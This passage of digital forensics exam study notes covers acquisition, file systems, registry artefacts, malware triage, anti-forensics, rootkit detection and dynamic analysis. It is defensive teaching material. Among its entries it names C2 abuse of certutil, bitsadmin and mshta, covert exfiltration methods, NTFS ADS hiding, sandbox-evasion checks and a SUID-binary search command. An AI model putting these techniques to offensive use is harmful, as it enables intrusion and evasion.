  6. Context: vulnerability scanner? Admin tool? Backup? Monitoring agent? Test environment?
  7. Vulnerability: does the target run the vulnerable service?

Exam tip:

  • Dynamic/live acquisition: collect volatile data from running system; changes state but preserves RAM/process/network evidence.

Documentation

Write Blockers and Acquisition Integrity

  • Write blocker: Hardware device preventing any write commands reaching the evidence drive during imaging. Required for forensically sound disk acquisition — preserves original evidence state.
  • Hardware vs software: Hardware write blockers preferred — operate at hardware/firmware level, cannot be bypassed by OS. Software blockers can fail due to OS-level issues.
  • Procedure: (1) Connect drive through write blocker. (2) Hash source (MD5 + SHA-256). (3) Image drive. (4) Hash image. (5) Verify hashes match. (6) Document write blocker make/model/serial in evidence log.
  • Live acquisition caveat: Cannot use write blocker when system cannot be powered off. Accept that acquisition alters some metadata — document all changes and justify in case notes.

FAT — File Allocation Table

  • Variants: FAT12 (floppy), FAT16 (old hard drives), FAT32 (USB/memory cards, max 4GB file), exFAT (flash media, no 4GB limit)
  • Structure: Boot sector → FAT table (cluster allocation map) → Root directory entries → Data area
  • Directory entries: Fixed 32-byte records: 8.3 filename, attributes, first cluster, file size, created/modified/accessed timestamps
  • Long File Names (LFN): Multiple consecutive entries with attribute 0x0F store names up to 255 chars
  • Deletion: First byte of directory entry set to 0xE5. Data clusters marked free in FAT but NOT zeroed → recoverable until overwritten.
  • No journaling: FAT has no transaction log. Fewer forensic artifacts than NTFS but easier to carve deleted files.

ACLs, SIDs and File Permissions

  • Every NTFS file/folder has a security descriptor containing DACL (who can access), SACL (what to audit), owner SID
  • Forensic check: Unexpected SID with Full Control on sensitive files = backdoor permission

NTFS Timestamp Storage vs Display

  • NTFS stores all timestamps in UTC (Universal Coordinated Time) in the $MFT.
  • Windows Explorer displays timestamps in the local time of the system.
  • When mounting a forensic image on an analyst machine in a different timezone → timestamps display incorrectly → always convert to UTC before building a timeline.
  • FAT filesystem stores local time with no timezone metadata → ambiguous when the victim system's timezone is unknown.

  • Registry hives: SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT, UsrClass.dat.
  • USB artefacts: USBSTOR, MountedDevices, device serials, first/last connection.
  • Autorun/startup: Run/RunOnce keys, services, scheduled tasks, Winlogon, Shell, AppInit_DLLs.
  • User accounts: SAM, ProfileList, last logon-related keys.
  • Protected storage/credentials: may reveal saved secrets depending on artefact and permissions.
  • ACLs on registry keys can allow persistence or privilege escalation if weak.
  • Shimcache/Amcache/UserAssist provide execution-related evidence with caveats.

UserAssist Detail

  • Location: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count
  • Content: ROT13-encoded program paths, run count, focus time, last execution timestamp.
  • GUIDs: {CEBFF5CD-ACE2-4F4F-9178-9926F41749EA} = executed programs; {F4E57C4B-2036-45F0-A9AB-443BCFE33D9F} = shortcut links.
  • Forensic value: Records GUI-launched program execution with timestamps and run counts; more granular than Prefetch for user-initiated execution.
  • Parse with: UserAssistView (NirSoft), Registry Explorer (Eric Zimmerman), RegRipper.
  • Caveat: Only tracks programs launched via Explorer shell; command-line execution may not appear.

BAM / DAM (Background Activity Moderator)

  • Location: HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\{SID} and ...\dam\UserSettings\{SID}
  • OS: Windows 10 version 1709+ and Windows 11.
  • Content: Execution timestamps and full paths for recently executed programs, including background tasks.
  • Forensic value: Provides execution evidence even when Prefetch is disabled (e.g., on servers); records both foreground and background execution.
  • Parse with: BAMParser/MiniTimeline, Registry Explorer, or direct registry parsing.
  • Caveat: Entries are limited (typically ~100 most recent); may be cleared on system maintenance cycles.
  • Use case: determine whether a USB device was connected, identify serial/vendor/product data, and correlate drive letters to user activity.
  • Common confusion: a USB artefact may prove connection, but file access or exfiltration requires correlation with shellbags, LNK files, RecentDocs, event logs, or file timestamps.

E7 — Identifying Suspect Files

  • Hash tables: compare to known-good/known-bad sets; use SHA-256 primarily.
  • Strings: URLs, IPs, registry paths, commands, mutexes, user agents, errors.
  • Permissions: writable service paths or executables in unusual writable locations.
  • Packed executables: high entropy, few imports, unusual sections, small import table.
  • Fuzzy hashing: ssdeep/TLSH helps find related variants.
  • Signature analysis: Authenticode validity, publisher, timestamp, certificate anomalies.

NSRL, Import Hash, and FLOSS

  • NSRL (National Software Reference Library): Database of hashes of legitimate software from known vendors. Use to exclude known-good files from investigation — dramatically reduces noise in large-scale triage. Available as hashset in tools like Autopsy and X-Ways.
  • imphash (Import Hash): Hash of the PE import table in specific order. Same imports in same order = likely same malware family or compiler. Use to cluster related samples and identify variants of the same malware.
  • FLOSS (FireEye Labs Obfuscated String Solver): Extracts obfuscated strings that strings tool misses — stack strings, decoded strings, XOR-encoded strings. Run: floss malware.exe
  • Triage workflow: Compute hash → NSRL exclude known-good → VirusTotal lookup → strings + FLOSS → imphash clustering → static analysis

Malware Packing and Entropy Analysis

Packing Indicators

  • High entropy (>7.0) in code sections → likely packed or encrypted.
  • Few imports in the import table (only LoadLibrary / GetProcAddress).
  • Section names: UPX0, UPX1, .aspack, .themida.
  • Small original section with large appended section.
  • Unusual entry point (not at code section start).

File Permissions and Signature Analysis

  • File permissions (Windows): Writable service executables = binary planting for privilege escalation. Check with icacls or Sysinternals AccessChk. World-writable directories in service path = DLL hijacking risk.
  • File permissions (Linux): SUID (chmod u+s) — executable runs with file owner's privileges. Malicious SUID binary = instant privilege escalation. Find with: find / -perm -4000 -type f. SGID and world-writable (777) are also suspicious.
  • Signature analysis / magic bytes: File type identified by header bytes, not extension. PE files: 4D 5A (MZ). ZIP: 50 4B 03 04. PDF: 25 50 44 46 (%PDF). ELF: 7F 45 4C 46. Tool: file filename or Detect-It-Easy (DIE).
  • Extension mismatch: File named image.jpg with MZ magic bytes = disguised executable. Always verify magic bytes, not just extension.

E8 — Storage Media

HPA and DCO

  • Host Protected Area (HPA): Hidden disk area normally inaccessible to the operating system; may hide data from ordinary imaging.
  • Device Configuration Overlay (DCO): Firmware-level configuration that can report a smaller apparent disk size than physical capacity.
  • Forensic implication: Acquisition tools should detect and document HPA/DCO so evidence scope is defensible.
  • Hard disk interfaces: PATA/SATA/SCSI/SAS; understand physical/logical acquisition differences.
  • HPA/DCO can hide disk areas; forensic tools should detect/report them.
  • Password protection and full-disk encryption can block acquisition without keys.
  • SSDs/flash: wear levelling and TRIM affect deleted-data recovery.
  • RAID: know levels, parity/mirroring/striping, and need for controller/order metadata.
  • NAS: network shares, snapshots, logs, user permissions, and remote acquisition considerations.

E11 — Malware Behaviours and Anti-Forensics

Steganography detection methods

  • File size anomalies: Compare expected size with observed size for the media type.
  • Visual/audio review: Look for distortion, artifacts, or suspicious appended data.
  • Metadata and strings: Use strings, exiftool, and file identification.
  • Embedded data carving: Use binwalk or foremost to identify appended or embedded files.
  • Specialised tools: StegDetect may help with older JPEG steganography techniques.
  • Encryption: protect C2/payloads or ransomware files.
  • Steganography: hide data in images/media.
  • Password-protected archives: evade scanners and stage data.
  • Obfuscation: encoded strings, packed executables, control-flow tricks.
  • Covert storage: NTFS ADS, slack space, registry blobs, hidden directories.
  • Covert communications: DNS, HTTPS, ICMP, social/cloud platforms.
  • Data erasure: wiping tools, log deletion, timestomping, secure delete.

Malware Encryption Techniques

  • Payload encryption: Malware encrypts its C2 traffic, dropped files, and embedded data to evade detection and complicate analysis
  • Common algorithms: XOR (simple, fast), AES (strong, common in commodity malware), RC4 (legacy), ChaCha20
  • Custom encryption: Malware authors implement weak custom ciphers — often breakable via frequency analysis or brute force
  • Ransomware: Hybrid encryption — RSA to protect symmetric key, AES to encrypt files. Without private key, files unrecoverable.
  • Config encryption: C2 IP/domain, mutex, campaign ID stored encrypted in binary — decrypt by locating key and applying algorithm (see F6)

Password Protection & Covert Communication Techniques

  • Password Protection: Malware delivered in password-protected archives (ZIP, RAR, 7z) to bypass email gateway AV. Password provided separately in email body or SMS.
  • Covert storage: NTFS ADS hides files in metadata streams — file.txt:payload.exe invisible to normal dir listing. Detect with dir /r.
  • Covert C2 communication: Legitimate protocol abuse (HTTP/S, DNS, SMTP), domain fronting, LOLBins for C2 (certutil, bitsadmin, mshta).
  • Covert recon: Passive OSINT, slow scanning below IDS thresholds, blending with legitimate admin traffic.
  • Covert exfiltration: Incremental transfers, DNS-encoded data, steganography, cloud storage APIs.

E12 — Rootkit Identification

  • Rootkits hide files, processes, registry keys, drivers, or network connections.
  • Hooking: user-mode API hooks, kernel SSDT hooks, inline patching, filter drivers.
  • Detection: compare high-level API output with raw disk/memory views; look for hidden drivers, suspicious kernel modules, and discrepancies.
  • Tools/approach: memory analysis, driver enumeration, GMER-like checks, Autoruns, kernel module review.

Cross-View Detection — psscan vs pslist and Bootkits

  • psscan vs pslist discrepancy: pslist walks EPROCESS doubly-linked list (manipulable). psscan scans raw memory for EPROCESS structures. Process in psscan but missing from pslist = DKOM rootkit hiding it.
  • modules vs modscan: Same cross-view for kernel drivers — modscan finds hidden drivers absent from module list.
  • SSDT hook detection: Volatility ssdt plugin. SSDT entries pointing outside ntoskrnl.exe/win32k.sys address ranges = kernel hook by rootkit.
  • Bootkit: Infects MBR or VBR — loads before OS, patches kernel during boot. Detect: compare first 512 bytes of disk against known-good baseline. Secure Boot prevents unsigned pre-OS code.
  • Filter driver detection: fltMC filters lists active mini-filter drivers. Unknown filter not in signed driver database = rootkit candidate.

How to Identify Rootkits — Cross-View Detection

Rootkits subvert the OS to hide their presence. Detection compares what the OS reports (potentially manipulated) against raw memory/disk reads (harder to manipulate). Discrepancy = rootkit indicator.

PE Magic Bytes and Key Analysis Techniques

  • Magic bytes: PE files start with 4D 5A ("MZ") at byte 0. PE signature 50 45 00 00 ("PE\0\0") at offset in e_lfanew (byte 0x3C). These definitively identify PE files.
  • Import table (IAT) capability map:
    • CreateRemoteThread + WriteProcessMemory → process injection
    • CryptEncrypt / CryptGenKey → cryptographic operations (ransomware, C2)
    • WinExec / ShellExecute → code execution
    • RegSetValueEx → registry persistence
    • InternetConnect / HttpSendRequest → HTTP C2
  • Section entropy: Normal code ~6.0 bits/byte. Packed or encrypted section >7.0 bits = compressed/encrypted — unpack before further analysis.
  • CAPA tool: capa malware.exe → automatically maps binary capabilities to MITRE ATT&CK framework. Best triage tool for rapid capability identification.

SSDT Patching

SSDT = System Service Descriptor Table
  → Maps syscall numbers to kernel function addresses

Rootkit patches SSDT entries to point to malicious functions:
  Original: NtQuerySystemInformation → ntoskrnl!NtQuerySystemInformation
  Patched:  NtQuerySystemInformation → rootkit!FakeNtQuerySystemInformation

Effect: When userspace calls NtQuerySystemInformation (used by Task Manager,
        Process Explorer), the rootkit filters out its own process from results.

Detection: Compare live SSDT values against ntoskrnl.exe export addresses
           Tools: GMER, Volatility ssdt plugin, Windbg !chkimg

DKOM — Direct Kernel Object Manipulation

EPROCESS structures form a doubly-linked list (ActiveProcessLinks)
  Rootkit unlinks target EPROCESS from the list:
  
  Normal:   ProcessA ←→ ProcessB ←→ ProcessC
  After:    ProcessA ←→ ProcessC  (ProcessB unlinked but still in memory)

Effect: Tools using PsGetNextProcess (pslist) won't see ProcessB
        Tools scanning raw memory (psscan) WILL find ProcessB

Detection: psscan vs pslist discrepancy = DKOM indicator

Filter Driver Hiding

  • Malicious filter driver registered in I/O stack (filesystem, network, keyboard)
  • Intercepts IRP (I/O Request Packets) and modifies results
  • Can hide files (filesystem filter), network connections (TDI/NDIS filter), keystrokes (keyboard filter)
  • Detection: enumerate loaded drivers via Volatility modules / driverscan, check against signed driver list

Dynamic Analysis Workflow

  1. Setup environment: Isolated VM (no internet), snapshot before execution, INetSim or FakeNet-NG to simulate network.
  2. Before-state capture: Regshot snapshot 1, Procmon start, Wireshark start.
  3. Execute malware: Run sample, wait sufficient time (VM sandbox evasion may need >5 minutes).
  4. After-state capture: Regshot snapshot 2 → compare, Procmon save log, Wireshark save pcap.
  5. Analyze outputs:
    • File activity: files dropped/modified/deleted, especially %TEMP%, %APPDATA%, Startup.
    • Registry: persistence keys (Run, RunOnce, Services, Winlogon).
    • Network: C2 destinations, beacon interval, DNS queries, User-Agent.
    • Process: parent-child spawning, injected processes, mutexes.

  • Malware checks CPUID (VM bit), number of CPU cores (<2 = sandbox), uptime (<10 minutes = sandbox).
  • Checks number of files on Desktop, screen resolution, specific VMware/VirtualBox registry keys.
  • Delays execution beyond typical sandbox observation windows (>5 minutes).
  • Requires user interaction (mouse movement, clicks) or specific environment (domain join, locale).
